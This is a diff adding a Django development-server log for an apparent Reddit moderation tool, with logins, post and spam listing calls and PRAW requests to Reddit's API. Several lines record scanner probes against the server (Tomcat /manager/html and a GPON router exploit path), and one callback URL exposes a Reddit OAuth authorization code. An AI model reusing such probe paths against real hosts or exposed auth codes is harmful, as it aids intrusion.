@@ -1,0 +1,2550 @@
+2021-01-22:09:17:12 DEBUG  [selector_events.py:__init__:L54] Using selector: EpollSelector
+2021-01-22:09:17:12 DEBUG  [selector_events.py:__init__:L54] Using selector: EpollSelector
+Watching for file changes with StatReloader
+2021-01-22:09:17:12 INFO   [autoreload.py:run_with_reloader:L613] Watching for file changes with StatReloader
+[22/Jan/2021 09:17:50] "OPTIONS /rest-auth/user/ HTTP/1.1" 200 0
+[22/Jan/2021 09:17:50] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[22/Jan/2021 09:17:50] "OPTIONS /reddit_logged HTTP/1.1" 200 0
+[22/Jan/2021 09:17:50] "OPTIONS /reddit_logged/ HTTP/1.1" 200 0
+[22/Jan/2021 09:17:50] "GET /reddit_logged/ HTTP/1.1" 200 4
+[22/Jan/2021 09:17:50] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[22/Jan/2021 09:17:50] "OPTIONS /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 0
+[22/Jan/2021 09:17:50] "OPTIONS /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 0
+[22/Jan/2021 09:17:50] "GET /reddit_logged/ HTTP/1.1" 200 4
+[22/Jan/2021 09:17:50] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 09:17:51] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 09:17:51] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 09:17:51] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 09:17:51] "OPTIONS /post/?post_type=all&sort=new&filtered=all&page=2&is_private=true HTTP/1.1" 200 0
+[22/Jan/2021 09:17:51] "GET /post/?post_type=all&sort=new&filtered=all&page=2&is_private=true HTTP/1.1" 200 9000
+[22/Jan/2021 09:17:54] "OPTIONS /post/?post_type=all&sort=new&filtered=all&page=3&is_private=true HTTP/1.1" 200 0
+[22/Jan/2021 09:17:54] "GET /post/?post_type=all&sort=new&filtered=all&page=3&is_private=true HTTP/1.1" 200 10309
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-22:09:40:29 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-22:09:40:29 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[22/Jan/2021 09:40:29] "GET /manager/html HTTP/1.1" 400 66138
+[22/Jan/2021 09:42:01] "OPTIONS /rest-auth/login/ HTTP/1.1" 200 0
+[22/Jan/2021 09:42:02] "POST /rest-auth/login/ HTTP/1.1" 200 50
+[22/Jan/2021 09:42:02] "OPTIONS /rest-auth/user/ HTTP/1.1" 200 0
+[22/Jan/2021 09:42:02] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[22/Jan/2021 09:42:02] "OPTIONS /reddit_logged HTTP/1.1" 200 0
+[22/Jan/2021 09:42:02] "GET /reddit_logged HTTP/1.1" 301 0
+[22/Jan/2021 09:42:02] "OPTIONS /reddit_logged/ HTTP/1.1" 200 0
+[22/Jan/2021 09:42:02] "GET /reddit_logged/ HTTP/1.1" 200 4
+[22/Jan/2021 09:42:02] "OPTIONS /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 0
+[22/Jan/2021 09:42:02] "OPTIONS /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 0
+[22/Jan/2021 09:42:02] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 09:42:02] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 09:42:36] "OPTIONS /post/?post_type=all&sort=new&filtered=all&page=2&is_private=true HTTP/1.1" 200 0
+[22/Jan/2021 09:42:36] "GET /post/?post_type=all&sort=new&filtered=all&page=2&is_private=true HTTP/1.1" 200 9000
+[22/Jan/2021 09:42:37] "OPTIONS /post/?post_type=all&sort=new&filtered=all&page=3&is_private=true HTTP/1.1" 200 0
+[22/Jan/2021 09:42:37] "GET /post/?post_type=all&sort=new&filtered=all&page=3&is_private=true HTTP/1.1" 200 10309
+[22/Jan/2021 09:43:17] "OPTIONS /apply_rules/ HTTP/1.1" 200 0
+[22/Jan/2021 09:43:17] "POST /apply_rules/ HTTP/1.1" 202 0
+[22/Jan/2021 09:43:17] "OPTIONS /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 0
+[22/Jan/2021 09:43:17] "OPTIONS /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 0
+[22/Jan/2021 09:43:17] "OPTIONS /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 0
+[22/Jan/2021 09:43:17] "OPTIONS /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 0
+[22/Jan/2021 09:43:17] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 09:43:17] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 09:43:17] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 1193
+[22/Jan/2021 09:43:17] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6972
+[22/Jan/2021 09:43:17] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 09:43:17] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 9045
+[22/Jan/2021 09:43:20] "POST /apply_rules/ HTTP/1.1" 202 0
+[22/Jan/2021 09:43:20] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 09:43:20] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 09:43:20] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 52
+[22/Jan/2021 09:43:20] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 09:43:20] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 09:43:20] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 6975
+[22/Jan/2021 09:43:23] "POST /apply_rules/ HTTP/1.1" 202 0
+[22/Jan/2021 09:43:23] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 09:43:23] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 09:43:23] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 09:43:23] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 1193
+[22/Jan/2021 09:43:23] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6972
+[22/Jan/2021 09:43:23] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 9045
+[22/Jan/2021 09:43:53] "POST /apply_rules/ HTTP/1.1" 202 0
+[22/Jan/2021 09:43:53] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 09:43:53] "GET /spam/?post_type=all&sort=created-new&filtered=filtered&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 09:43:53] "GET /post/?post_type=all&sort=new&filtered=filtered&page=1&is_private=true HTTP/1.1" 200 52
+[22/Jan/2021 09:43:53] "GET /spam/?post_type=all&sort=created-new&filtered=unfiltered&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 09:43:53] "GET /post/?post_type=all&sort=new&filtered=unfiltered&page=1&is_private=true HTTP/1.1" 200 6975
+[22/Jan/2021 09:43:53] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 09:44:05] "OPTIONS /rest-auth/logout/ HTTP/1.1" 200 0
+[22/Jan/2021 09:44:05] "POST /rest-auth/logout/ HTTP/1.1" 200 37
+[22/Jan/2021 10:52:04] "GET / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: '127.0.0.1:8080'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+2021-01-22:11:00:39 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: '127.0.0.1:8080'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /GponForm/diag_Form
+2021-01-22:11:00:39 WARNING [log.py:log_response:L230] Bad Request: /GponForm/diag_Form
+[22/Jan/2021 11:00:39] "POST /GponForm/diag_Form?images/ HTTP/1.1" 400 67096
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-22:11:13:23 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-22:11:13:23 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[22/Jan/2021 11:13:23] "GET /manager/html HTTP/1.1" 400 66138
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-22:11:32:07 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-22:11:32:07 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[22/Jan/2021 11:32:07] "GET /manager/html HTTP/1.1" 400 66139
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-22:12:11:19 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-22:12:11:19 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[22/Jan/2021 12:11:19] "GET /manager/html HTTP/1.1" 400 66138
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-22:12:30:04 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-22:12:30:04 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[22/Jan/2021 12:30:04] "GET /manager/html HTTP/1.1" 400 66140
+Forbidden: /rest-auth/user/
+2021-01-22:12:33:39 WARNING [log.py:log_response:L230] Forbidden: /rest-auth/user/
+[22/Jan/2021 12:33:39] "GET /rest-auth/user/ HTTP/1.1" 403 27
+[22/Jan/2021 12:33:42] "OPTIONS /rest-auth/logout/ HTTP/1.1" 200 0
+Forbidden: /rest-auth/logout/
+2021-01-22:12:33:42 WARNING [log.py:log_response:L230] Forbidden: /rest-auth/logout/
+[22/Jan/2021 12:33:42] "POST /rest-auth/logout/ HTTP/1.1" 403 59
+[22/Jan/2021 12:33:47] "OPTIONS /rest-auth/login/ HTTP/1.1" 200 0
+[22/Jan/2021 12:33:47] "POST /rest-auth/login/ HTTP/1.1" 200 50
+[22/Jan/2021 12:33:47] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[22/Jan/2021 12:33:47] "GET /reddit_logged/ HTTP/1.1" 200 4
+[22/Jan/2021 12:33:47] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 12:33:47] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 12:34:38] "OPTIONS /rest-auth/login/ HTTP/1.1" 200 0
+[22/Jan/2021 12:34:39] "POST /rest-auth/login/ HTTP/1.1" 200 50
+[22/Jan/2021 12:34:39] "OPTIONS /rest-auth/user/ HTTP/1.1" 200 0
+[22/Jan/2021 12:34:39] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[22/Jan/2021 12:34:39] "OPTIONS /reddit_logged HTTP/1.1" 200 0
+[22/Jan/2021 12:34:39] "OPTIONS /reddit_logged/ HTTP/1.1" 200 0
+[22/Jan/2021 12:34:39] "GET /reddit_logged/ HTTP/1.1" 200 4
+[22/Jan/2021 12:34:39] "OPTIONS /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 0
+[22/Jan/2021 12:34:39] "OPTIONS /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 0
+[22/Jan/2021 12:34:39] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 12:34:39] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 12:35:01] "OPTIONS /reddit_logout/ HTTP/1.1" 200 0
+[22/Jan/2021 12:35:01] "GET /reddit_logout/ HTTP/1.1" 200 0
+[22/Jan/2021 12:35:01] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[22/Jan/2021 12:35:01] "GET /reddit_logged/ HTTP/1.1" 200 5
+[22/Jan/2021 12:35:01] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 12:35:01] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 12:35:04] "OPTIONS /reddit_login/ HTTP/1.1" 200 0
+2021-01-22:12:35:04 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): pypi.org:443
+2021-01-22:12:35:04 DEBUG  [connectionpool.py:_make_request:L461] https://pypi.org:443 "GET /pypi/praw/json HTTP/1.1" 200 30056
+[22/Jan/2021 12:35:04] "GET /reddit_login/ HTTP/1.1" 200 221
+[22/Jan/2021 12:35:11] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 12:35:11] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 12:35:15] "OPTIONS /rest-auth/logout/ HTTP/1.1" 200 0
+[22/Jan/2021 12:35:15] "POST /rest-auth/logout/ HTTP/1.1" 200 37
+[22/Jan/2021 12:37:00] "OPTIONS /rest-auth/registration/ HTTP/1.1" 200 0
+Bad Request: /rest-auth/registration/
+2021-01-22:12:37:00 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:37:00] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+Bad Request: /rest-auth/registration/
+2021-01-22:12:37:03 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:37:03] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+Bad Request: /rest-auth/registration/
+2021-01-22:12:37:05 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:37:05] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+Bad Request: /rest-auth/registration/
+2021-01-22:12:37:07 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:37:07] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+Bad Request: /rest-auth/registration/
+2021-01-22:12:37:08 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:37:08] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+Bad Request: /rest-auth/registration/
+2021-01-22:12:38:03 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:38:03] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+Bad Request: /rest-auth/registration/
+2021-01-22:12:38:04 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:38:04] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+Forbidden: /rest-auth/logout/
+2021-01-22:12:38:24 WARNING [log.py:log_response:L230] Forbidden: /rest-auth/logout/
+[22/Jan/2021 12:38:24] "POST /rest-auth/logout/ HTTP/1.1" 403 27
+[22/Jan/2021 12:38:35] "POST /rest-auth/login/ HTTP/1.1" 200 50
+[22/Jan/2021 12:38:35] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[22/Jan/2021 12:38:35] "GET /reddit_logged/ HTTP/1.1" 200 5
+[22/Jan/2021 12:38:35] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 12:38:35] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 12:38:46] "POST /rest-auth/logout/ HTTP/1.1" 200 37
+Bad Request: /rest-auth/registration/
+2021-01-22:12:39:01 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:39:01] "POST /rest-auth/registration/ HTTP/1.1" 400 115
+Bad Request: /rest-auth/registration/
+2021-01-22:12:39:02 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:39:02] "POST /rest-auth/registration/ HTTP/1.1" 400 115
+Bad Request: /rest-auth/registration/
+2021-01-22:12:39:03 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:39:03] "POST /rest-auth/registration/ HTTP/1.1" 400 115
+Bad Request: /rest-auth/registration/
+2021-01-22:12:39:03 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:39:03] "POST /rest-auth/registration/ HTTP/1.1" 400 115
+Bad Request: /rest-auth/registration/
+2021-01-22:12:39:03 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:39:03] "POST /rest-auth/registration/ HTTP/1.1" 400 115
+Bad Request: /rest-auth/registration/
+2021-01-22:12:39:04 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:39:04] "POST /rest-auth/registration/ HTTP/1.1" 400 115
+[22/Jan/2021 12:39:04] "POST /rest-auth/login/ HTTP/1.1" 200 50
+[22/Jan/2021 12:39:04] "GET /rest-auth/user/ HTTP/1.1" 200 74
+[22/Jan/2021 12:39:04] "GET /reddit_logged/ HTTP/1.1" 200 5
+[22/Jan/2021 12:39:04] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 52
+[22/Jan/2021 12:39:04] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 12:39:05] "POST /rest-auth/logout/ HTTP/1.1" 200 37
+Bad Request: /rest-auth/registration/
+2021-01-22:12:39:17 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:39:17] "POST /rest-auth/registration/ HTTP/1.1" 400 115
+Bad Request: /rest-auth/registration/
+2021-01-22:12:39:18 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:39:18] "POST /rest-auth/registration/ HTTP/1.1" 400 115
+[22/Jan/2021 12:39:20] "OPTIONS /rest-auth/registration/ HTTP/1.1" 200 0
+Bad Request: /rest-auth/registration/
+2021-01-22:12:39:20 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:39:20] "POST /rest-auth/registration/ HTTP/1.1" 400 84
+Bad Request: /rest-auth/registration/
+2021-01-22:12:39:21 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:39:21] "POST /rest-auth/registration/ HTTP/1.1" 400 115
+Bad Request: /rest-auth/registration/
+2021-01-22:12:39:21 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:39:21] "POST /rest-auth/registration/ HTTP/1.1" 400 84
+Bad Request: /rest-auth/registration/
+2021-01-22:12:39:30 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:39:30] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+Bad Request: /rest-auth/registration/
+2021-01-22:12:39:31 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:39:31] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+Bad Request: /rest-auth/registration/
+2021-01-22:12:39:32 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:39:32] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+Bad Request: /rest-auth/registration/
+2021-01-22:12:39:42 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:39:42] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+Bad Request: /rest-auth/registration/
+2021-01-22:12:39:43 WARNING [log.py:log_response:L230] Bad Request: /rest-auth/registration/
+[22/Jan/2021 12:39:43] "POST /rest-auth/registration/ HTTP/1.1" 400 152
+[22/Jan/2021 12:39:49] "POST /rest-auth/login/ HTTP/1.1" 200 50
+[22/Jan/2021 12:39:49] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[22/Jan/2021 12:39:49] "GET /reddit_logged/ HTTP/1.1" 200 5
+[22/Jan/2021 12:39:49] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 12:39:49] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 12:39:55] "POST /rest-auth/logout/ HTTP/1.1" 200 37
+[22/Jan/2021 12:40:33] "POST /rest-auth/login/ HTTP/1.1" 200 50
+[22/Jan/2021 12:40:33] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[22/Jan/2021 12:40:33] "GET /reddit_logged/ HTTP/1.1" 200 5
+[22/Jan/2021 12:40:33] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 12:40:33] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 12:41:06] "GET /reddit_login/ HTTP/1.1" 200 221
+[22/Jan/2021 12:41:19] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 12:41:19] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 12:41:55] "POST /rest-auth/logout/ HTTP/1.1" 200 37
+[22/Jan/2021 12:42:45] "POST /rest-auth/login/ HTTP/1.1" 200 50
+[22/Jan/2021 12:42:45] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[22/Jan/2021 12:42:45] "GET /reddit_logged/ HTTP/1.1" 200 5
+[22/Jan/2021 12:42:45] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 12:42:45] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 12:42:47] "OPTIONS /reddit_login/ HTTP/1.1" 200 0
+[22/Jan/2021 12:42:47] "GET /reddit_login/ HTTP/1.1" 200 221
+[22/Jan/2021 12:42:49] "GET /reddit_auth?state=1&code=CZJ_qvqDerf29oRyxRFREmNMITSh6g HTTP/1.1" 301 0
+2021-01-22:12:42:49 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): www.reddit.com:443
+2021-01-22:12:42:50 DEBUG  [connectionpool.py:_make_request:L461] https://www.reddit.com:443 "POST /api/v1/access_token HTTP/1.1" 200 224
+[22/Jan/2021 12:42:50] "GET /reddit_auth/?state=1&code=CZJ_qvqDerf29oRyxRFREmNMITSh6g HTTP/1.1" 302 0
+[22/Jan/2021 12:42:50] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[22/Jan/2021 12:42:50] "GET /reddit_logged/ HTTP/1.1" 200 4
+[22/Jan/2021 12:42:50] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[22/Jan/2021 12:42:50] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 12:42:50] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 12:42:50] "GET /reddit_logged/ HTTP/1.1" 200 4
+[22/Jan/2021 12:42:50] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 52
+[22/Jan/2021 12:42:50] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[22/Jan/2021 12:42:52] "OPTIONS /mod_subreddits/ HTTP/1.1" 200 0
+2021-01-22:12:42:52 DEBUG  [sessions.py:_log_request:L116] Fetching: GET https://oauth.reddit.com/subreddits/mine/contributor/
+2021-01-22:12:42:52 DEBUG  [sessions.py:_log_request:L117] Data: None
+2021-01-22:12:42:52 DEBUG  [sessions.py:_log_request:L118] Params: {'limit': 100, 'raw_json': 1}
+2021-01-22:12:42:52 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): www.reddit.com:443
+2021-01-22:12:42:53 DEBUG  [connectionpool.py:_make_request:L461] https://www.reddit.com:443 "POST /api/v1/access_token HTTP/1.1" 200 161
+2021-01-22:12:42:53 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): oauth.reddit.com:443
+2021-01-22:12:42:53 DEBUG  [connectionpool.py:_make_request:L461] https://oauth.reddit.com:443 "GET /subreddits/mine/contributor/?limit=100&raw_json=1 HTTP/1.1" 200 1175
+2021-01-22:12:42:53 DEBUG  [sessions.py:_make_request:L200] Response: 200 (1175 bytes)
+[22/Jan/2021 12:42:53] "GET /mod_subreddits/ HTTP/1.1" 200 17
+[22/Jan/2021 12:42:54] "OPTIONS /removal_reasons/?param=KIXModSandbox HTTP/1.1" 200 0
+[22/Jan/2021 12:42:54] "OPTIONS /community_rules?param=KIXModSandbox HTTP/1.1" 200 0
+[22/Jan/2021 12:42:54] "OPTIONS /get_moderators/?param=KIXModSandbox HTTP/1.1" 200 0
+2021-01-22:12:42:54 DEBUG  [sessions.py:_log_request:L116] Fetching: GET https://oauth.reddit.com/api/v1/KIXModSandbox/removal_reasons
+2021-01-22:12:42:54 DEBUG  [sessions.py:_log_request:L117] Data: None
+2021-01-22:12:42:54 DEBUG  [sessions.py:_log_request:L118] Params: {'raw_json': 1}
+2021-01-22:12:42:54 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): www.reddit.com:443
+2021-01-22:12:42:54 DEBUG  [sessions.py:_log_request:L116] Fetching: GET https://oauth.reddit.com/r/KIXModSandbox/about/moderators/
+2021-01-22:12:42:54 DEBUG  [sessions.py:_log_request:L117] Data: None
+2021-01-22:12:42:54 DEBUG  [sessions.py:_log_request:L118] Params: {'raw_json': 1}
+2021-01-22:12:42:54 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): www.reddit.com:443
+[22/Jan/2021 12:42:54] "OPTIONS /community_rules/?param=KIXModSandbox HTTP/1.1" 200 0
+2021-01-22:12:42:54 DEBUG  [sessions.py:_log_request:L116] Fetching: GET https://oauth.reddit.com/r/KIXModSandbox/about/rules
+2021-01-22:12:42:54 DEBUG  [sessions.py:_log_request:L117] Data: None
+2021-01-22:12:42:54 DEBUG  [sessions.py:_log_request:L118] Params: {'raw_json': 1}
+2021-01-22:12:42:54 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): www.reddit.com:443
+2021-01-22:12:42:54 DEBUG  [connectionpool.py:_make_request:L461] https://www.reddit.com:443 "POST /api/v1/access_token HTTP/1.1" 200 161
+2021-01-22:12:42:54 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): oauth.reddit.com:443
+2021-01-22:12:42:54 DEBUG  [connectionpool.py:_make_request:L461] https://www.reddit.com:443 "POST /api/v1/access_token HTTP/1.1" 200 161
+2021-01-22:12:42:54 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): oauth.reddit.com:443
+2021-01-22:12:42:54 DEBUG  [connectionpool.py:_make_request:L461] https://www.reddit.com:443 "POST /api/v1/access_token HTTP/1.1" 200 161
+2021-01-22:12:42:54 DEBUG  [connectionpool.py:_new_conn:L975] Starting new HTTPS connection (1): oauth.reddit.com:443
+2021-01-22:12:42:54 DEBUG  [connectionpool.py:_make_request:L461] https://oauth.reddit.com:443 "GET /r/KIXModSandbox/about/rules?raw_json=1 HTTP/1.1" 200 1309
+2021-01-22:12:42:54 DEBUG  [sessions.py:_make_request:L200] Response: 200 (1309 bytes)
+[22/Jan/2021 12:42:54] "GET /community_rules/?param=KIXModSandbox HTTP/1.1" 200 21
+2021-01-22:12:42:54 DEBUG  [connectionpool.py:_make_request:L461] https://oauth.reddit.com:443 "GET /r/KIXModSandbox/about/moderators/?raw_json=1 HTTP/1.1" 200 231
+2021-01-22:12:42:54 DEBUG  [sessions.py:_make_request:L200] Response: 200 (231 bytes)
+[22/Jan/2021 12:42:54] "GET /get_moderators/?param=KIXModSandbox HTTP/1.1" 200 14
